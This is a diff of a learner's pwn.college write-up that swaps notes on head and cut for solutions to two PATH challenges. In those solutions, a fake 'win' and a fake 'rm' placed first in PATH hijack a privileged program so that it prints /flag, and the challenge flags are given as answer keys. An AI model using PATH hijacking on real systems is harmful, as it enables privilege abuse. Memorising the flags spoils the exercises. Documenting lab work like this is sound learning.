@@ -59,35 +59,48 @@ pwn.college{4ujsqe24mxK25jlCdYtNc_W5dkD.01NzEzNxwCM3gjNzEzW}
 - *which* command allows us to see the full path of the command we pass in it as argument
 
 ## Challenge 4: Adding commands
-  Output only the first 10 lines
-### My solve
-**Flag:** `pwn.college{c3ixgnj3lM4taBq4NGjbOEsgTdD.0lNxEzNxwCM3gjNzEzW}`
 
-The output of */challenge/pwn* is piped to *head* command. The output of this is given to */challenge/college* which will check and accordingly give the flag
+### My solve
+**Flag:** `pwn.college{cZY_n6150qy-A8qPSErzJ9Qw1om.QX2cjM1wCM3gjNzEzW}`
+I am trying to create a custom command *win*
 
 ```bash
-hacker@data~extracting-the-first-lines-with-head:~$ /challenge/pwn | head -n 7 | /challenge/college
-Congratulations, you piped the right codes!
-pwn.college{c3ixgnj3lM4taBq4NGjbOEsgTdD.0lNxEzNxwCM3gjNzEzW}
+hacker@path~adding-commands:~$ mkdir /tmp/pwn
+hacker@path~adding-commands:~$ cd /tmp/pwn
+hacker@path~adding-commands:/tmp/pwn$ echo /bin/cat /flag > win
+hacker@path~adding-commands:/tmp/pwn$ chmod +x win
+hacker@path~adding-commands:/tmp/pwn$ PATH="/tmp/pwn:$PATH" /challenge/run
+Invoking 'win'....
+pwn.college{cZY_n6150qy-A8qPSErzJ9Qw1om.QX2cjM1wCM3gjNzEzW}
 ```
 
 ### What I learned
-- *head* command displays the first 10 lines of the output
-- If we need it to specifically display a certain number of lines, we can use *-n* follwed by the number of lines we want it to show
+- I use the absolute path of *cat* (*/bin/cat*) so that the real cat program is being run and changes in PATH will not affect it.
+- I store a set of commands to be run when *win* is executed (*echo /bin/cat /flag* meaning displaying the reading of flag) and make *win* executable using chmod
+- *PATH="/tmp/pwn:$PATH" /challenge/run* makes it so that when *run* program is run, *tmp/run* is the first place they will try to find it
+   - When *win* command is invoked, PATH makes it so that each and every directory is searched to find executable file named       win. so we put the *win* file on top to find it first
 
  ## Challenge 5: Hijacking commands
-  Extracting specified columns from the text.
+  Changing the operation that a command carries out
 ### My solve
-**Flag:** `pwn.college{guuhcmqE0xXW90HtXkdQHfTeU66.01NxEzNxwCM3gjNzEzW}`
-
-We output the contents of */challenge/run* into *cut* command. This gives us the 2nd column data. This is used as input to *tr* command to get it all in one line.
+**Flag:** `pwn.college{o2htbfKGu0jaWb5FueDxs90wGUq.QX3cjM1wCM3gjNzEzW}`
+according to the design of the challenge, When */challenge/run* is carried out, *rm* command is also carried out, thus deleting the flag. The main logic behind solving this, is creating OUR *rm* and putting it at the top of the PATH.
 
 ```bash
-hacker@data~extracting-specific-sections-of-text:~$ /challenge/run | cut -d " " -f 2 | tr -d "\n"
-pwn.college{guuhcmqE0xXW90HtXkdQHfTeU66.01NxEzNxwCM3gjNzEzW}
+hacker@path~hijacking-commands:~$ mkdir /tmp/pwn
+hacker@path~hijacking-commands:~$ cd /tmp/pwn
+hacker@path~hijacking-commands:/tmp/pwn$ echo '#!/bin/bash' > /tmp/pwn/rm
+hacker@path~hijacking-commands:/tmp/pwn$ chmod a+x /tmp/pwn/rm
+hacker@path~hijacking-commands:/tmp/pwn$ echo 'cat -- "$@"' >> /tmp/pwn/rm
+hacker@path~hijacking-commands:/tmp/pwn$ PATH="/tmp/pwn:$PATH" 
+hacker@path~hijacking-commands:/tmp/pwn$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /tmp/pwn/rm. Executing!
+cat: -f: No such file or directory
+pwn.college{o2htbfKGu0jaWb5FueDxs90wGUq.QX3cjM1wCM3gjNzEzW}
 ```
 
 ### What I learned
-- *cut* command is used to extract columns from data
-- *-d* argument followed by a character (say 'a') means that the columns are separated by that character ('a')
-- *-f* argument is used to tell the command which column number needs to be extracted.
+- */tmp/pwn* is a temporary place for storing OUR *rm*
+- *$@* means that everything in the file needs to be passed exactly as they are given
+- *PATH="/tmp/pwn:$PATH"* put our created *rm* at the start of the list, so that our rm (/tmp/pwn/rm) is executed, not (/bin/rm) which is the ACTUAL rm
